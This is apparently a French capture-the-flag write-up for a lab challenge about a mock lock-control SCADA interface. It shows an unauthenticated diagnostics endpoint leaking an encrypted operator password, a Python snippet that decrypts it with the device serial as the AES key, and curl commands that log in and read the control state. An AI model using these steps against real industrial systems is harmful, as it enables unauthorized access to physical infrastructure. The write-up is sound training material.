---
title: "Sail Away · Welcome to the Machine"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "crypto-web"
difficulty: "—"
points: 100
os: "—"
date: 2026-11-20
author: "Sh1n"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/sail-away/welcome-to-the-machine/writeup-welcome-to-the-machine.md"
license: "CC BY-SA 4.0"
status: published
---

# Welcome to the Machine — Sail Away (Crypto/Web, 100 pts, q:3)

## Objectif

Le yacht RAVN doit sortir par l'**Écluse Est**. Le poste de supervision
**LockCtl 3.2** de Citadel contrôle l'écluse. Il faut prendre la main sur l'HMI
et récupérer le flag.

Cible de l'instance : `http://172.28.0.2:8080` (sous-réseau VPN
`172.28.0.0/24`, IP variable).

## État initial

- Page `LockCtl 3.2 — Écluse Est`, formulaire d'authentification opérateur.
- Un bouton **Diagnostics / maintenance** affiche un panneau avec un export de
  configuration et une documentation opérateur.
- `GET /api/operator-docs` et `GET /api/state` renvoient `401` sans session.
- `GET /api/diag/export` est accessible **sans authentification**.

## Reconnaissance

L'export de diagnostic fuit la configuration de l'automate :

```text
; LockCtl device configuration export
; station: Citadel / East Lock
[device]
model      = LockCtl-3200
firmware   = 3.2
serial     = 7K3MLCX320A1F9E2D4B6C8A0E3F1B7D2
modbus     = tcp/502

[auth]
realm      = operator
username   = oper
cipher     = aes-256-cbc
secret     = nxxCp+CzXWZIqgwX3pLzsXFTVvfL4Il0d++hTKCHO/w=

[net]
hmi_bind   = 0.0.0.0:8080
plc_host   = plc:502
```

Le champ `secret` est le mot de passe opérateur chiffré en AES-256-CBC. Le
numéro de série fait exactement 32 octets ASCII : c'est la clé AES-256. Le
secret base64 fait 32 octets : les 16 premiers sont l'IV, les 16 derniers le
cryptogramme.

```python
import base64, subprocess
serial = "7K3MLCX320A1F9E2D4B6C8A0E3F1B7D2"
blob = base64.b64decode("nxxCp+CzXWZIqgwX3pLzsXFTVvfL4Il0d++hTKCHO/w=")
key, iv, ct = serial.encode(), blob[:16], blob[16:]
subprocess.run(["openssl", "enc", "-d", "-aes-256-cbc",
                "-K", key.hex(), "-iv", iv.hex(), "-nopad"],
               input=ct)
```

Le déchiffrement donne le mot de passe de l'opérateur `oper` (non recopié ici).

## Exploitation

```bash
# 1. Récupérer la configuration
curl -s http://TARGET/api/diag/export

# 2. Déchiffrer le secret (voir ci-dessus) puis se connecter
curl -s -c cookies -X POST -H 'Content-Type: application/json' \
  -d '{"u":"oper","p":"<mot_de_passe>"}' \
  http://TARGET/api/login

# 3. Lire l'état de l'automate
curl -s -b cookies http://TARGET/api/state
```

`GET /api/state` avec la session opérateur retourne l'état SCADA et contient le
flag du challenge. La valeur exacte a été soumise à la plateforme et n'est pas
recopiée dans ce document.

## Pistes qui n'ont pas abouti

- Les mots de passe par défaut (`oper`, `operator`, `admin`, `lockctl`, etc.)
  sont refusés (`401 Identifiants invalides`).
- `api/operator-docs`, `api/state`, `api/session` sont protégés sans session.
- L'export de diagnostic est la seule fuite non authentifiée ; il ne contient
  pas le flag en clair, mais la matière pour déchiffrer le secret.

## Validation reproductible

1. `GET /api/diag/export` : récupérer `serial` et `secret`.
2. Déchiffrer `secret` en AES-256-CBC avec la clé = `serial` ASCII, IV = 16
   premiers octets du base64 décodé, cryptogramme = 16 derniers octets.
3. `POST /api/login` avec `u=oper` et le mot de passe déchiffré : session
   opérateur.
4. `GET /api/state` avec le cookie de session : le flag est dans la réponse.
5. Soumettre le flag au challenge : la plateforme l'accepte.
